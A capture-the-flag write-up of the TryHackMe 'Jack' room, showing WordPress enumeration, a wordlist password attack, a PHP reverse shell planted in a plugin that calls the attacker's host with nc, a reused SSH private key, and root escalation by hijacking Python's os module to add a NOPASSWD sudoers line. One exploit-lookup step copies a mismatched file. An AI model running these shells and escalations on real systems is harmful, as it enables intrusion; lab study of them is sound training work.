<h1 align="center">Jack</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/51214f37-6075-45cd-8dd1-a287156c39b0"><br>
July 1, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure,<br>
part of my <code>421</code>-day-streak in<a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Compromise a web server running Wordpress, obtain a low privileged user and escalate your privileges to root using a Python module.</em>.<br>
Access it <a href="https://tryhackme.com/room/jack"</a>here.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/7df9a119-cc74-4e02-969d-13f7fd928a3c"></p>

<br>

<h2>Task 1 . Deploy & Root</h2>

<p>Connect to our network and deploy this machine.<br>

<h3>nmap</h3>
<p>

- <code>22</code> : <code>ssh</code> : <code>OpenSSH 7.2p2</code><br>
- <code>80</code> : <code>http</code> : <code>Apache httpd 2.4.18</code>, <code>robots.txt</code>, </code>WordPress 5.3.2</code>, <code>/wp-admin/</code></p>

```bash
:~/Jack# nmap -sV -sC -Pn -T4 -p- TargetIP
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 5.3.2
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Jack&#039;s Personal Site &#8211; Blog for Jacks writing adven...
```

<br>

<h3>TargetIP</h3>

![image](https://github.com/user-attachments/assets/52ddef5a-94c8-408d-94cd-6e9e7e095fea)


<h3>TargetIP/robots.txt</h3>

```bash
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
```

![image](https://github.com/user-attachments/assets/8dc94e99-d9e3-4e35-a124-8e660442058e)

<br>

<h3>/etc/hosts</h3>

```bash
TargetIP  jack.thm
```

<br>

<h3>jack.thm</h3>

![image](https://github.com/user-attachments/assets/89204e5a-8e75-415a-b90b-54f677fb7c9d)

<br>

<h3>FUFF</h3>

```bash
:~/Jack# ffuf -c -w /usr/share/dirb/wordlists/common.txt -u http://jack.thm/FUZZ
...
                        [Status: 200, Size: 17360, Words: 1442, Lines: 272]
0                       [Status: 301, Size: 0, Words: 1, Lines: 1]
.htpasswd               [Status: 403, Size: 273, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 273, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 273, Words: 20, Lines: 10]
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1]
dashboard               [Status: 302, Size: 0, Words: 1, Lines: 1]
favicon.ico             [Status: 200, Size: 0, Words: 1, Lines: 1]
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1]
javascript              [Status: 301, Size: 309, Words: 20, Lines: 10]
login                   [Status: 302, Size: 0, Words: 1, Lines: 1]
robots.txt              [Status: 200, Size: 67, Words: 4, Lines: 4]
server-status           [Status: 403, Size: 273, Words: 20, Lines: 10]
wp-admin                [Status: 301, Size: 307, Words: 20, Lines: 10]
wp-content              [Status: 301, Size: 309, Words: 20, Lines: 10]
wp-includes             [Status: 301, Size: 310, Words: 20, Lines: 10]
xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1]
:: Progress: [4614/4614] :: Job [1/1] :: 82 req/sec :: Duration: [0:01:01] :: Errors: 0 ::
```

<h3>gobuster</h3>

```bash
:~/Jack# gobuster dir -e -u http://jack.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html -t 100
...
http://jack.thm/login                (Status: 302) [Size: 0] [--> http://jack.thm/wp-login.php]
http://jack.thm/.html                (Status: 403) [Size: 273]
http://jack.thm/.php                 (Status: 403) [Size: 273]
http://jack.thm/index.php            (Status: 301) [Size: 0] [--> http://jack.thm/]
http://jack.thm/0                    (Status: 301) [Size: 0] [-->
...
```

<br>

<h3>wpscan</h3>
<p>

- <code>jack</code><br>
- <code>danny</code><br>
- <code>wendy</code></p>

```bash
:~/Jack# wpscan --url http://jack.thm -e u
...
Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://jack.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://jack.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://jack.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://jack.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://jack.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.3.2 identified (Insecure, released on 2019-12-18).
 | Found By: Rss Generator (Passive Detection)
 |  - http://jack.thm/index.php/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>
 |  - http://jack.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>

[+] WordPress theme in use: online-portfolio
 | Location: http://jack.thm/wp-content/themes/online-portfolio/
 | Last Updated: 2020-08-18T00:00:00.000Z
 | Readme: http://jack.thm/wp-content/themes/online-portfolio/readme.txt
 | [!] The version is out of date, the latest version is 0.0.9
 | Style URL: http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2
 | Style Name: Online Portfolio
 | Style URI: https://www.amplethemes.com/downloads/online-protfolio/
 | Description: Online Portfolio WordPress portfolio theme for building personal website. You can take full advantag...
 | Author: Ample Themes
 | Author URI: https://amplethemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 0.0.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2, Match: 'Version: 0.0.7'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==========================================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] jack
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://jack.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] danny
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] wendy
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

...
```

<br>

<h3>usernames</h3>

```bash
:~/Jack# cat usernames
jack
danny
wendy
```

<br>

<h3>wpscan | users & passwords</h3>
<p><code>wendy</code> : <code>changelater</code></p>

```bash
:~/Jack# wpscan --url http://jack.thm -U usernames -P /usr/share/wordlists/fasttrack.txt
...

[+] Performing password attack on Xmlrpc against 3 user/s
[SUCCESS] - wendy / changelater                                                                                                                                                                                                                                                                                                                                                       
Trying danny / starwars Time: 00:00:07 <=============================================================================================================================================================================================================================                                                                              > (646 / 867) 74.50%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: wendy, Password: changelater
...
```

<br>

<h3>wpscan | plugins</h3>
<p><code>wendy</code> : <code>changelater</code></p>

```bash
:~/Jack# wpscan --url http://jack.thm --enumerate p --plugins-detection aggressive
...
[+] Enumerating Most Popular Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:00:12 <==================================================================================================================================================================================================================================================================> (1500 / 1500) 100.00% Time: 00:00:12
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://jack.thm/wp-content/plugins/akismet/
 | Last Updated: 2021-03-02T18:10:00.000Z
 | Readme: http://jack.thm/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 4.1.9
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://jack.thm/wp-content/plugins/akismet/, status: 200
 |
 | Version: 3.1.7 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://jack.thm/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://jack.thm/wp-content/plugins/akismet/readme.txt

[+] user-role-editor
 | Location: http://jack.thm/wp-content/plugins/user-role-editor/
 | Last Updated: 2021-02-26T04:17:00.000Z
 | Readme: http://jack.thm/wp-content/plugins/user-role-editor/readme.txt
 | [!] The version is out of date, the latest version is 4.58.3
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://jack.thm/wp-content/plugins/user-role-editor/, status: 200
 |
 | Version: 4.24 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://jack.thm/wp-content/plugins/user-role-editor/readme.txt
```

<br>

<h3>searchsploit</h3>

```bash
:~/Jack# searchsploit wordpress role privilege
-------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                |  Path
-------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin User Role Editor < 4.25 - Privilege Escalation                                               | php/webapps/44595.rb
-------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
:~/Jack# searchsploit -m php/webapps/45595.rb
  Exploit: FluxBB < 1.5.6 - SQL Injection
      URL: https://www.exploit-db.com/exploits/45595
     Path: /opt/exploitdb/exploits/multiple/webapps/45595.py
    Codes: CVE-2014-10029
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /root/Jack/45595.py
:~/Jack# ls
45595.py
:~/Jack# cat 45595.py
...
```

<br>

<h3>jack.thm/wp-login.php</h3>

![image](https://github.com/user-attachments/assets/7feccf8d-2359-4937-a9d5-06659d565a78)

![image](https://github.com/user-attachments/assets/ceb065dc-b360-47ed-a4e2-5043a4e79301)

<p>
  
- clicked <code>Profiles</code><br>
- updated it</p>

![image](https://github.com/user-attachments/assets/67d1b3db-7beb-4a3a-80d1-bb5c9c8be535)

![image](https://github.com/user-attachments/assets/9032fee6-568a-4e85-a204-af417f80183c)

<p>added ...</p>

![image](https://github.com/user-attachments/assets/9567f44a-0a80-4640-bcdd-7643ceeed42f)

<p>clicked <code>Forward</code></p>

![image](https://github.com/user-attachments/assets/35a1e5dc-13ba-40be-86b5-0787beeb6d23)

<p>

- clicked <code>Plugins</code> > <code>Installed Plugins</code><br>
- identified that <code>Hello Dolly</code> is <code>active</code></p>

![image](https://github.com/user-attachments/assets/700301fe-d239-4a3f-9e28-737874a56aaf)


<p>clicked <code>Plugins</code> > <code>Plugin Editor</code> > <code>I understand</code></p>

![image](https://github.com/user-attachments/assets/8c705f67-8488-4721-879a-e5bf91d7f15c)

```bash
:~/Jack# nc -nlvp 4444
```

```bash
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.229 4444 >/tmp/f")?>
```

<p>- clicked <code>Update</code></p>

![image](https://github.com/user-attachments/assets/198099a7-68b1-4514-b6c2-b503dc5edf20)

<p>- used <code>curl</code></p>

```bash
:~/Jack# curl http://jack.thm/wp-content/plugins/hello.php
```

<p>- got the shell</p>

```bash
:~/Jack# nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on AttackIP 60638
/bin/sh: 0: can't access tty; job control turned off
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@jack:/var/www/html/wp-content/plugins$ ^Z
[1]+  Stopped                 nc -nlvp 4444
:~/Jack# stty raw -echo; fg
nc -nlvp 4444

www-data@jack:/var/www/html/wp-content/plugins$ 
```

<p>user.txt</p>

```bash
www-data@jack:/var/www/html/wp-content/plugins$ cat /home/jack/user.txt
0052f7829e48752f2e7bf50f1231548a
www-data@jack:/var/www/html/wp-content/plugins$ 
```

<br>

<h3>/var/wwww/html</h3>

```bash
www-data@jack:/var/www/html$ ls
index.php	 wp-blog-header.php    wp-cron.php	  wp-mail.php
license.txt	 wp-comments-post.php  wp-includes	  wp-settings.php
readme.html	 wp-config-sample.php  wp-links-opml.php  wp-signup.php
wp-activate.php  wp-config.php	       wp-load.php	  wp-trackback.php
wp-admin	 wp-content	       wp-login.php	  xmlrpc.php
www-data@jack:/var/www/html$ 
```

<br>

<h3>reminder.txt</h3>

```bash
www-data@jack:/home/jack$ cat reminder.txt

Please read the memo on linux file permissions, last time your backups almost got us hacked! Jack will hear about this when he gets back.

www-data@jack:/home/jack$ 
```

<br>

<h3>backups</h3>

```bash
www-data@jack:/home/jack$ find / -type d -name "*backup*" 2>/dev/null
/var/backups
www-data@jack:/home/jack$ ls -la /var/backups
total 776
drwxr-xr-x  2 root root     4096 Jan 10  2020 .
drwxr-xr-x 14 root root     4096 Jan  9  2020 ..
-rw-r--r--  1 root root    40960 Jan  9  2020 alternatives.tar.0
-rw-r--r--  1 root root     9931 Jan  9  2020 apt.extended_states.0
-rw-r--r--  1 root root      713 Jan  8  2020 apt.extended_states.1.gz
-rw-r--r--  1 root root       11 Jan  8  2020 dpkg.arch.0
-rw-r--r--  1 root root       43 Jan  8  2020 dpkg.arch.1.gz
-rw-r--r--  1 root root      437 Jan  8  2020 dpkg.diversions.0
-rw-r--r--  1 root root      202 Jan  8  2020 dpkg.diversions.1.gz
-rw-r--r--  1 root root      207 Jan  9  2020 dpkg.statoverride.0
-rw-r--r--  1 root root      129 Jan  8  2020 dpkg.statoverride.1.gz
-rw-r--r--  1 root root   552673 Jan  9  2020 dpkg.status.0
-rw-r--r--  1 root root   129487 Jan  8  2020 dpkg.status.1.gz
-rw-------  1 root root      802 Jan  9  2020 group.bak
-rw-------  1 root shadow    672 Jan  9  2020 gshadow.bak
-rwxrwxrwx  1 root root     1675 Jan 10  2020 id_rsa
-rw-------  1 root root     1626 Jan  9  2020 passwd.bak
-rw-------  1 root shadow    969 Jan  9  2020 shadow.bak
```

<br>

<h3>id_rsa</h3>

```bash
www-data@jack:/home/jack$ cat /var/backups/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAxfBR9F9V5G2snv1Xaaxv3VHbFZ2VZRwGyU+ah6komBeaAldr
8SNK1x0wu/eXjLjrWnVaYOEU2YUrHzn/duB3Wvm8xyA0T8x/WbV2osWaVOafkPSv
YpV4OdQrdRoS3PEOXRnS+CnOTAgPWo2+xfH1XeldFw9XiYrprTugmwCcYDuBZB3r
...
```

```bash
:~/Jack# nano id_rsa
:~/Jack# chmod 600 id_rsa
```

<br>

<h3>ssh</h3>

```bash
:~/Jack# ssh -i id_rsa jack@jack.thm
...
jack@jack:~$ id
uid=1000(jack) gid=1000(jack) groups=1000(jack),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare),1001(family)
jack@jack:~$ pwd
/home/jack
jack@jack:~$ 
```

<br>

<h3>pspy</h3>

```bash
:~/Jack# python3 -m http.server
```

```bash
jack@jack:/dev/shm$ wget http://10.10.17.229:8000/pspy64
...
pspy64                                   100%[=================================================================================>]   2.94M  --.-KB/s    in 0.02s   
```

![image](https://github.com/user-attachments/assets/a9893b1c-8da7-4a56-8b27-0a3996e53441)


```bash
jack@jack:/dev/shm$ chmod +x pspy64; ./pspy64
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
...
2025/06/30 21:29:05 CMD: UID=0    PID=972    | /usr/lib/snapd/snapd 
2025/06/30 21:29:05 CMD: UID=0    PID=966    | /usr/sbin/atd -f 
2025/06/30 21:29:05 CMD: UID=108  PID=959    | /usr/sbin/rsyslogd -n 
2025/06/30 21:29:05 CMD: UID=111  PID=943    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation 
2025/06/30 21:29:05 CMD: UID=0    PID=926    | /usr/bin/lxcfs /var/lib/lxcfs/ 
2025/06/30 21:29:05 CMD: UID=0    PID=918    | /lib/systemd/systemd-logind 
2025/06/30 21:29:05 CMD: UID=0    PID=914    | /usr/sbin/cron -f 
2025/06/30 21:29:05 CMD: UID=0    PID=906    | /usr/sbin/acpid 
2025/06/30 21:29:05 CMD: UID=0    PID=904    | /usr/lib/accountsservice/accounts-daemon 
...
2025/06/30 21:29:05 CMD: UID=0    PID=887    | /sbin/iscsid 
...
2025/06/30 21:29:05 CMD: UID=0    PID=737    | /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0 
...
2025/06/30 21:29:05 CMD: UID=33   PID=5296   | /usr/sbin/apache2 -k start 
...
2025/06/30 21:29:05 CMD: UID=33   PID=4838   | /usr/sbin/apache2 -k start 
2025/06/30 21:29:05 CMD: UID=102  PID=476    | /lib/systemd/systemd-timesyncd 
2025/06/30 21:29:05 CMD: UID=0    PID=434    | /lib/systemd/systemd-udevd 
...
2025/06/30 21:29:05 CMD: UID=0    PID=396    | /sbin/lvmetad -f 
...
2025/06/30 21:29:05 CMD: UID=0    PID=366    | /lib/systemd/systemd-journald 
...
2025/06/30 21:29:05 CMD: UID=0    PID=1279   | logger -t mysqld -p daemon error 
2025/06/30 21:29:05 CMD: UID=118  PID=1278   | /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --skip-log-error --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306 
2025/06/30 21:29:05 CMD: UID=0    PID=1247   | /usr/sbin/apache2 -k start 
...
2025/06/30 21:29:05 CMD: UID=0    PID=1126   | /bin/bash /usr/bin/mysqld_safe 
...
2025/06/30 21:29:05 CMD: UID=0    PID=1092   | /usr/lib/policykit-1/polkitd --no-debug 
2025/06/30 21:29:05 CMD: UID=0    PID=1088   | /usr/sbin/sshd -D 
2025/06/30 21:29:05 CMD: UID=0    PID=1050   | /sbin/agetty --noclear tty1 linux 
2025/06/30 21:29:05 CMD: UID=0    PID=1049   | /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220 
2025/06/30 21:29:05 CMD: UID=0    PID=1011   | /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog 
...
2025/06/30 21:30:01 CMD: UID=0    PID=5734   | /usr/sbin/CRON -f 
2025/06/30 21:30:01 CMD: UID=0    PID=5736   | /usr/bin/python /opt/statuscheck/checker.py 
2025/06/30 21:30:01 CMD: UID=0    PID=5735   | /bin/sh -c /usr/bin/python /opt/statuscheck/checker.py
2025/06/30 21:30:01 CMD: UID=0    PID=5736   | /usr/bin/python /opt/statuscheck/checker.py 
2025/06/30 21:30:01 CMD: UID=0    PID=5737   | /usr/bin/python /opt/statuscheck/checker.py 
2025/06/30 21:30:01 CMD: UID=0    PID=5738   | sh -c /usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log 

2025/06/30 21:32:01 CMD: UID=0    PID=5742   | /usr/bin/python /opt/statuscheck/checker.py 
2025/06/30 21:32:01 CMD: UID=0    PID=5741   | /bin/sh -c /usr/bin/python /opt/statuscheck/checker.py 
2025/06/30 21:32:01 CMD: UID=0    PID=5740   | /usr/sbin/CRON -f 
2025/06/30 21:32:01 CMD: UID=0    PID=5743   | /usr/bin/python /opt/statuscheck/checker.py 
2025/06/30 21:32:01 CMD: UID=0    PID=5744   | sh -c /usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log 

2025/06/30 21:34:01 CMD: UID=0    PID=5748   | /usr/bin/python /opt/statuscheck/checker.py 
2025/06/30 21:34:01 CMD: UID=0    PID=5747   | /bin/sh -c /usr/bin/python /opt/statuscheck/checker.py 
2025/06/30 21:34:01 CMD: UID=0    PID=5746   | /usr/sbin/CRON -f 
2025/06/30 21:34:01 CMD: UID=0    PID=5749   | /usr/bin/python /opt/statuscheck/checker.py 
2025/06/30 21:34:01 CMD: UID=0    PID=5750   | sh -c /usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log 
```

![image](https://github.com/user-attachments/assets/06ff5afd-78fb-4b61-b1fd-a6c7a8c1f28b)

<br>

<h3>checker.py</h3>
<p><code>os</code></p>

```bash
jack@jack:/opt/statuscheck$ ls
checker.py  output.log
ack@jack:/opt/statuscheck$ cat checker.py
import os

os.system("/usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log")
```

<br>

<h3>output.log</h3>

```bash
jack@jack:/opt/statuscheck$ cat output.log | grep http
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
```

<br>

```bash

<p>added to <code>os.py</code></p>

```bash
def system(smt):
    import subprocess
    subprocess.call("printf '\njack ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers ", shell = True)
```

```bash
jack@jack: find / -group family 2>/dev/null
/usr/lib/python2.7/_threading_local.py
/usr/lib/python2.7/plistlib.pyc
/usr/lib/python2.7/stringprep.py
/usr/lib/python2.7/ihooks.pyc
/usr/lib/python2.7/weakref.py
/usr/lib/python2.7/sgmllib.pyc
/usr/lib/python2.7/os.py
/usr/lib/python2.7/posixpath.py
/usr/lib/python2.7/copy_reg.py
/usr/lib/python2.7/bdb.py
/usr/lib/python2.7/smtpd.pyc
/usr/lib/python2.7/dircache.pyc
/usr/lib/python2.7/bisect.pyc
/usr/lib/python2.7/fnmatch.py
/usr/lib/python2.7/heapq.py
/usr/lib/python2.7/struct.pyc
/usr/lib/python2.7/fpformat.py
/usr/lib/python2.7/hotshot
/usr/lib/python2.7/shutil.py
...
jack@jack:/$ nano /usr/lib/python2.7/os.py
jack@jack:/$ tail /usr/lib/python2.7/os.py
```


```bash
jack@jack:/var/log$ sudo su -
root@jack:~# ls
root.txt
root@jack:~# cat root.txt
b8b63a861cc09e853f29d8055d64bffb
root@jack:~#
```

<br>
<br>

![image](https://github.com/user-attachments/assets/dd131b1f-9c79-4496-bd20-78ffd2eef357)

![image](https://github.com/user-attachments/assets/6989f084-6cee-4f19-91a0-70e0bdff9eaa)

<br>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| July 1, 2025      | 421      |     168ᵗʰ    |      5ᵗʰ     |     216ᵗʰ   |     10ᵗʰ    |  111,999 |    816    |     63    |

</div>

![image](https://github.com/user-attachments/assets/be1f031c-fc72-466a-acb1-d16e3ac5966a)

![image](https://github.com/user-attachments/assets/df88c325-645c-483a-abbf-45a31de5c20e)

![image](https://github.com/user-attachments/assets/9df228db-1563-427e-8219-6c2309b94c6f)

![image](https://github.com/user-attachments/assets/0722228d-96b9-4c71-ae7b-5d19f89b7573)

![image](https://github.com/user-attachments/assets/86fa1ce5-22dd-4680-9cc7-04400f862e22)

